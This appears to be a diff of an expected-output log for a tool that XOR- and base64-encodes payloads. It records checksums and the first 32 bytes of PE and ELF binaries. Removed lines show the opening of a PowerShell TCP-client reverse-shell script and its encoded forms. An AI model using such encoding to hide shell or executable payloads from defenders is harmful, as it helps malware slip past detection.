 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 8 log subnumber: 1
-63978c8054377ddbc0e2cc1bcdaa8986 
- b',;\xf1abaaaeaaa\x9e\x9eaa\xd9aaaaaaa!aaaaaaa' 
+eac2eb141772a78884950482c675ae6f 
+ b'\x87\x90Z\xca\xc9\xca\xca\xca\xce\xca\xca\xca55\xca\xcar\xca\xca\xca\xca\xca\xca\xca\x8a\xca\xca\xca\xca\xca\xca\xca' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 8 log subnumber: 1
 88668949b9059f4a07be8d4b79430ad7 
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 9 log subnumber: 0: 
-1c710f8ac518589570ea0e2cc4ec787b  
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827  
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 9 log subnumber: 0
-9b25be8ba06c45837e39541fc2678d10 
- b'\x12UZ_SXB\x16\x0b\x16mxSB\x18eYU]SBE\x18bUFuZ_SXB' 
+f3faccfca8e175ed8ab7d66f8beeee07 
+ b'\xf1\xcb\xc2\xc8\x8c\x8f\x8f\x8e\x8e\x8e\x8e\x8e\x8e\x8e\x8e\x8e\x8d\x8e\xb0\x8e\x8f\x8e\x8e\x8e\xee\x9f\x8e\x8e\x8e\x8e\x8e\x8e' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 9 log subnumber: 0
-02eba676446abd9764f44640c2c77527 
- b'ElVaX1NYQhYLFm14U0IYZVlVXVNCRRhi' 
+02218e080021c90fdb15ba26dc1b5dc5 
+ b'8cvCyIyPj46Ojo6Ojo6Ojo2OsI6Pjo6O' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 9 log subnumber: 0
-9b25be8ba06c45837e39541fc2678d10 
- b'\x12UZ_SXB\x16\x0b\x16mxSB\x18eYU]SBE\x18bUFuZ_SXB' 
+f3faccfca8e175ed8ab7d66f8beeee07 
+ b'\xf1\xcb\xc2\xc8\x8c\x8f\x8f\x8e\x8e\x8e\x8e\x8e\x8e\x8e\x8e\x8e\x8d\x8e\xb0\x8e\x8f\x8e\x8e\x8e\xee\x9f\x8e\x8e\x8e\x8e\x8e\x8e' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 9 log subnumber: 0
-1c710f8ac518589570ea0e2cc4ec787b 
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827 
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 9 log subnumber: 1: 
 88668949b9059f4a07be8d4b79430ad7  
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 9 log subnumber: 1
-ab6a474ec62fe11e4cf7fef850901a5c 
- b'{l\xa6656662666\xc9\xc966\x8e6666666v6666666' 
+b5266e24800da3d035f8bd97acae7686 
+ b'\xc3\xd4\x1e\x8e\x8d\x8e\x8e\x8e\x8a\x8e\x8e\x8eqq\x8e\x8e6\x8e\x8e\x8e\x8e\x8e\x8e\x8e\xce\x8e\x8e\x8e\x8e\x8e\x8e\x8e' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 9 log subnumber: 1
-6e9c905b1004025b4921d03ca3b3e6f3 
- b'e2ymNjU2NjYyNjY2yck2No42NjY2NjY2' 
+4b8196a2616d092b2289116d0ce79e5b 
+ b'w9Qejo2Ojo6Kjo6OcXGOjjaOjo6Ojo6O' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 9 log subnumber: 1
-ab6a474ec62fe11e4cf7fef850901a5c 
- b'{l\xa6656662666\xc9\xc966\x8e6666666v6666666' 
+b5266e24800da3d035f8bd97acae7686 
+ b'\xc3\xd4\x1e\x8e\x8d\x8e\x8e\x8e\x8a\x8e\x8e\x8eqq\x8e\x8e6\x8e\x8e\x8e\x8e\x8e\x8e\x8e\xce\x8e\x8e\x8e\x8e\x8e\x8e\x8e' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 9 log subnumber: 1
 88668949b9059f4a07be8d4b79430ad7 
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 10 log subnumber: 0: 
-1c710f8ac518589570ea0e2cc4ec787b  
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827  
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 10 log subnumber: 0
-27b28215d34b003e248cbde75d8334ab 
- b'[\x1c\x13\x16\x1a\x11\x0b_B_$1\x1a\x0bQ,\x10\x1c\x14\x1a\x0b\x0cQ+\x1c\x0f<\x13\x16\x1a\x11\x0b' 
+972cd9de04a5a66fb71a4bb2542d7336 
+ b'\x11+"(loonnnnnnnnnmnPnonnn\x0e\x7fnnnnnn' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 10 log subnumber: 0
-1c710f8ac518589570ea0e2cc4ec787b 
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827 
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 10 log subnumber: 1: 
 88668949b9059f4a07be8d4b79430ad7  
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 10 log subnumber: 1
-328fdaa3cbb470a35328551802d34f12 
- b'2%\xef\x7f|\x7f\x7f\x7f{\x7f\x7f\x7f\x80\x80\x7f\x7f\xc7\x7f\x7f\x7f\x7f\x7f\x7f\x7f?\x7f\x7f\x7f\x7f\x7f\x7f\x7f' 
+d49ca0be640fc241d2dc2b45835668cd 
+ b'#4\xfenmnnnjnnn\x91\x91nn\xd6nnnnnnn.nnnnnnn' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 10 log subnumber: 1
 88668949b9059f4a07be8d4b79430ad7 
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 11 log subnumber: 0: 
-1c710f8ac518589570ea0e2cc4ec787b  
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827  
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 11 log subnumber: 0
-035973fa7c2a69c3abd0bbb7777e0d9e 
- b'\x8b\xcc\xc3\xc6\xca\xc1\xdb\x8f\x92\x8f\xf4\xe1\xca\xdb\x81\xfc\xc0\xcc\xc4\xca\xdb\xdc\x81\xfb\xcc\xdf\xec\xc3\xc6\xca\xc1\xdb' 
+a000d021bad66a684bb2ef7c6c70859e 
+ b'(\x12\x1b\x11UVVWWWWWWWWWTWiWVWWW7FWWWWWW' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 11 log subnumber: 0
-1c710f8ac518589570ea0e2cc4ec787b 
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827 
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 11 log subnumber: 1: 
 88668949b9059f4a07be8d4b79430ad7  
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 11 log subnumber: 1
-899447f6fc049b6738b8c4e3fabebadc 
- b'\xe2\xf5?\xaf\xac\xaf\xaf\xaf\xab\xaf\xaf\xafPP\xaf\xaf\x17\xaf\xaf\xaf\xaf\xaf\xaf\xaf\xef\xaf\xaf\xaf\xaf\xaf\xaf\xaf' 
+3de2eb47db94be32f40d05093589ca96 
+ b'\x1a\r\xc7WTWWWSWWW\xa8\xa8WW\xefWWWWWWW\x17WWWWWWW' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 11 log subnumber: 1
 88668949b9059f4a07be8d4b79430ad7 
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 12 log subnumber: 0: 
-1c710f8ac518589570ea0e2cc4ec787b  
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827  
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 12 log subnumber: 0
-af07b8cc4bc4932cd0af6f969f28c936 
- b'I\x0e\x01\x04\x08\x03\x19MPM6#\x08\x19C>\x02\x0e\x06\x08\x19\x1eC9\x0e\x1d.\x01\x04\x08\x03\x19' 
+90a4e5485c437c20333e936bde0eb7fe 
+ b'\x89\xb3\xba\xb0\xf4\xf7\xf7\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf5\xf6\xc8\xf6\xf7\xf6\xf6\xf6\x96\xe7\xf6\xf6\xf6\xf6\xf6\xf6' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 12 log subnumber: 0
-1c710f8ac518589570ea0e2cc4ec787b 
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827 
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 12 log subnumber: 1: 
 88668949b9059f4a07be8d4b79430ad7  
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 12 log subnumber: 1
-5c52f660c95a57db4300758cc1ac4a34 
- b' 7\xfdmnmmmimmm\x92\x92mm\xd5mmmmmmm-mmmmmmm' 
+eb9e7cc63f1b0ec45dff4b2fa243f011 
+ b'\xbb\xacf\xf6\xf5\xf6\xf6\xf6\xf2\xf6\xf6\xf6\t\t\xf6\xf6N\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xb6\xf6\xf6\xf6\xf6\xf6\xf6\xf6' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 12 log subnumber: 1
 88668949b9059f4a07be8d4b79430ad7 
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 13 log subnumber: 0: 
-1c710f8ac518589570ea0e2cc4ec787b  
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827  
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 13 log subnumber: 0
-594eb02a8d4721ad6f441155a790165c 
- b'JGNsaWVudCA9IFtOZXQuU29ja2V0cy5U' 
+47c03856c3187fdab3a0f42e6aa9a903 
+ b'f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAA' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 13 log subnumber: 0
-1c710f8ac518589570ea0e2cc4ec787b 
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827 
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 13 log subnumber: 1: 
 88668949b9059f4a07be8d4b79430ad7  
@@ -431,208 +431,208 @@ This is the checksum of what is preserved after applying base64 to the payload (
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 14 log subnumber: 0: 
-1c710f8ac518589570ea0e2cc4ec787b  
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827  
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 14 log subnumber: 0
-96cd2ad4a85660834726f653f552592d 
- b'T\x13\x1c\x19\x15\x1e\x04PMP+>\x15\x04^#\x1f\x13\x1b\x15\x04\x03^$\x13\x003\x1c\x19\x15\x1e\x04' 
+04a7fcd1a4c624183314b6adbc861229 
+ b'{AHB\x06\x05\x05\x04\x04\x04\x04\x04\x04\x04\x04\x04\x07\x04:\x04\x05\x04\x04\x04d\x15\x04\x04\x04\x04\x04\x04' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 14 log subnumber: 0
-3cb5cd3ab7b7ba4682412c65262debe8 
- b'VBMcGRUeBFBNUCs+FQReIx8TGxUEA14k' 
+f7c6b324db7bd5939209f33ba4c2bd49 
+ b'e0FIQgYFBQQEBAQEBAQEBAcEOgQFBAQE' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 14 log subnumber: 0
-96cd2ad4a85660834726f653f552592d 
- b'T\x13\x1c\x19\x15\x1e\x04PMP+>\x15\x04^#\x1f\x13\x1b\x15\x04\x03^$\x13\x003\x1c\x19\x15\x1e\x04' 
+04a7fcd1a4c624183314b6adbc861229 
+ b'{AHB\x06\x05\x05\x04\x04\x04\x04\x04\x04\x04\x04\x04\x07\x04:\x04\x05\x04\x04\x04d\x15\x04\x04\x04\x04\x04\x04' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 14 log subnumber: 0
-1c710f8ac518589570ea0e2cc4ec787b 
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827 
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 14 log subnumber: 1: 
 88668949b9059f4a07be8d4b79430ad7  
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 14 log subnumber: 1
-283e22cdba800fddcf68f86d50242525 
- b'=*\xe0psppptppp\x8f\x8fpp\xc8ppppppp0ppppppp' 
+8d385541460c98c0bd540532cc9f0fab 
+ b'I^\x94\x04\x07\x04\x04\x04\x00\x04\x04\x04\xfb\xfb\x04\x04\xbc\x04\x04\x04\x04\x04\x04\x04D\x04\x04\x04\x04\x04\x04\x04' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 14 log subnumber: 1
-581eb8d8cd58ba271da75a841a8b4d5f 
- b'PSrgcHNwcHB0cHBwj49wcMhwcHBwcHBw' 
+7f3489f743ec8ae9b5588151870827f6 
+ b'SV6UBAcEBAQABAQE+/sEBLwEBAQEBAQE' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 14 log subnumber: 1
-283e22cdba800fddcf68f86d50242525 
- b'=*\xe0psppptppp\x8f\x8fpp\xc8ppppppp0ppppppp' 
+8d385541460c98c0bd540532cc9f0fab 
+ b'I^\x94\x04\x07\x04\x04\x04\x00\x04\x04\x04\xfb\xfb\x04\x04\xbc\x04\x04\x04\x04\x04\x04\x04D\x04\x04\x04\x04\x04\x04\x04' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 14 log subnumber: 1
 88668949b9059f4a07be8d4b79430ad7 
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 15 log subnumber: 0: 
-1c710f8ac518589570ea0e2cc4ec787b  
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827  
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 15 log subnumber: 0
-116f75f38a19c23d64fba4fc02ac31b7 
- b'E\x02\r\x08\x04\x0f\x15A\\A:/\x04\x15O2\x0e\x02\n\x04\x15\x12O5\x02\x11"\r\x08\x04\x0f\x15' 
+760f57c3354abe28fee186397866fcc0 
+ b'\xb5\x8f\x86\x8c\xc8\xcb\xcb\xca\xca\xca\xca\xca\xca\xca\xca\xca\xc9\xca\xf4\xca\xcb\xca\xca\xca\xaa\xdb\xca\xca\xca\xca\xca\xca' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 15 log subnumber: 0
-05538c1967517583298aa26fb64559de 
- b'RQINCAQPFUFcQTovBBVPMg4CCgQVEk81' 
+dc1b33cf7b9bbafa0af7394ea6914aa6 
+ b'tY+GjMjLy8rKysrKysrKysnK9MrLysrK' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 15 log subnumber: 0
-116f75f38a19c23d64fba4fc02ac31b7 
- b'E\x02\r\x08\x04\x0f\x15A\\A:/\x04\x15O2\x0e\x02\n\x04\x15\x12O5\x02\x11"\r\x08\x04\x0f\x15' 
+760f57c3354abe28fee186397866fcc0 
+ b'\xb5\x8f\x86\x8c\xc8\xcb\xcb\xca\xca\xca\xca\xca\xca\xca\xca\xca\xc9\xca\xf4\xca\xcb\xca\xca\xca\xaa\xdb\xca\xca\xca\xca\xca\xca' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 15 log subnumber: 0
-1c710f8ac518589570ea0e2cc4ec787b 
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827 
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 15 log subnumber: 1: 
 88668949b9059f4a07be8d4b79430ad7  
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 15 log subnumber: 1
-63978c8054377ddbc0e2cc1bcdaa8986 
- b',;\xf1abaaaeaaa\x9e\x9eaa\xd9aaaaaaa!aaaaaaa' 
+eac2eb141772a78884950482c675ae6f 
+ b'\x87\x90Z\xca\xc9\xca\xca\xca\xce\xca\xca\xca55\xca\xcar\xca\xca\xca\xca\xca\xca\xca\x8a\xca\xca\xca\xca\xca\xca\xca' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 15 log subnumber: 1
-b8f09e42ccfa5ffcb736f479cccef7bb 
- b'LDvxYWJhYWFlYWFhnp5hYdlhYWFhYWFh' 
+0afbfb20204e0dcbdd82028448354613 
+ b'h5BaysnKysrOysrKNTXKynLKysrKysrK' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 15 log subnumber: 1
-63978c8054377ddbc0e2cc1bcdaa8986 
- b',;\xf1abaaaeaaa\x9e\x9eaa\xd9aaaaaaa!aaaaaaa' 
+eac2eb141772a78884950482c675ae6f 
+ b'\x87\x90Z\xca\xc9\xca\xca\xca\xce\xca\xca\xca55\xca\xcar\xca\xca\xca\xca\xca\xca\xca\x8a\xca\xca\xca\xca\xca\xca\xca' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 15 log subnumber: 1
 88668949b9059f4a07be8d4b79430ad7 
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 16 log subnumber: 0: 
-1c710f8ac518589570ea0e2cc4ec787b  
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827  
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 16 log subnumber: 0
-9b25be8ba06c45837e39541fc2678d10 
- b'\x12UZ_SXB\x16\x0b\x16mxSB\x18eYU]SBE\x18bUFuZ_SXB' 
+f3faccfca8e175ed8ab7d66f8beeee07 
+ b'\xf1\xcb\xc2\xc8\x8c\x8f\x8f\x8e\x8e\x8e\x8e\x8e\x8e\x8e\x8e\x8e\x8d\x8e\xb0\x8e\x8f\x8e\x8e\x8e\xee\x9f\x8e\x8e\x8e\x8e\x8e\x8e' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 16 log subnumber: 0
-02eba676446abd9764f44640c2c77527 
- b'ElVaX1NYQhYLFm14U0IYZVlVXVNCRRhi' 
+02218e080021c90fdb15ba26dc1b5dc5 
+ b'8cvCyIyPj46Ojo6Ojo6Ojo2OsI6Pjo6O' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 16 log subnumber: 0
-9b25be8ba06c45837e39541fc2678d10 
- b'\x12UZ_SXB\x16\x0b\x16mxSB\x18eYU]SBE\x18bUFuZ_SXB' 
+f3faccfca8e175ed8ab7d66f8beeee07 
+ b'\xf1\xcb\xc2\xc8\x8c\x8f\x8f\x8e\x8e\x8e\x8e\x8e\x8e\x8e\x8e\x8e\x8d\x8e\xb0\x8e\x8f\x8e\x8e\x8e\xee\x9f\x8e\x8e\x8e\x8e\x8e\x8e' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 16 log subnumber: 0
-1c710f8ac518589570ea0e2cc4ec787b 
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827 
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 16 log subnumber: 1: 
 88668949b9059f4a07be8d4b79430ad7  
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 16 log subnumber: 1
-ab6a474ec62fe11e4cf7fef850901a5c 
- b'{l\xa6656662666\xc9\xc966\x8e6666666v6666666' 
+b5266e24800da3d035f8bd97acae7686 
+ b'\xc3\xd4\x1e\x8e\x8d\x8e\x8e\x8e\x8a\x8e\x8e\x8eqq\x8e\x8e6\x8e\x8e\x8e\x8e\x8e\x8e\x8e\xce\x8e\x8e\x8e\x8e\x8e\x8e\x8e' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 16 log subnumber: 1
-6e9c905b1004025b4921d03ca3b3e6f3 
- b'e2ymNjU2NjYyNjY2yck2No42NjY2NjY2' 
+4b8196a2616d092b2289116d0ce79e5b 
+ b'w9Qejo2Ojo6Kjo6OcXGOjjaOjo6Ojo6O' 
 
 This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: 16 log subnumber: 1
-ab6a474ec62fe11e4cf7fef850901a5c 
- b'{l\xa6656662666\xc9\xc966\x8e6666666v6666666' 
+b5266e24800da3d035f8bd97acae7686 
+ b'\xc3\xd4\x1e\x8e\x8d\x8e\x8e\x8e\x8a\x8e\x8e\x8eqq\x8e\x8e6\x8e\x8e\x8e\x8e\x8e\x8e\x8e\xce\x8e\x8e\x8e\x8e\x8e\x8e\x8e' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 16 log subnumber: 1
 88668949b9059f4a07be8d4b79430ad7 
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 17 log subnumber: 0: 
-1c710f8ac518589570ea0e2cc4ec787b  
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827  
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 17 log subnumber: 0
-27b28215d34b003e248cbde75d8334ab 
- b'[\x1c\x13\x16\x1a\x11\x0b_B_$1\x1a\x0bQ,\x10\x1c\x14\x1a\x0b\x0cQ+\x1c\x0f<\x13\x16\x1a\x11\x0b' 
+972cd9de04a5a66fb71a4bb2542d7336 
+ b'\x11+"(loonnnnnnnnnmnPnonnn\x0e\x7fnnnnnn' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 17 log subnumber: 0
-1c710f8ac518589570ea0e2cc4ec787b 
- b'$client = [Net.Sockets.TcpClient' 
+824f47cf9b84dcece9bd1dde24efa827 
+ b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00`\x11\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 17 log subnumber: 1: 
 88668949b9059f4a07be8d4b79430ad7  
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 17 log subnumber: 1
-328fdaa3cbb470a35328551802d34f12 
- b'2%\xef\x7f|\x7f\x7f\x7f{\x7f\x7f\x7f\x80\x80\x7f\x7f\xc7\x7f\x7f\x7f\x7f\x7f\x7f\x7f?\x7f\x7f\x7f\x7f\x7f\x7f\x7f' 
+d49ca0be640fc241d2dc2b45835668cd 
+ b'#4\xfenmnnnjnnn\x91\x91nn\xd6nnnnnnn.nnnnnnn' 
 
 This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: 17 log subnumber: 1
 88668949b9059f4a07be8d4b79430ad7 
  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00' 
 
 This is the checksum of the file before encoding is applied from log number: 18 log subnumber: 0: 
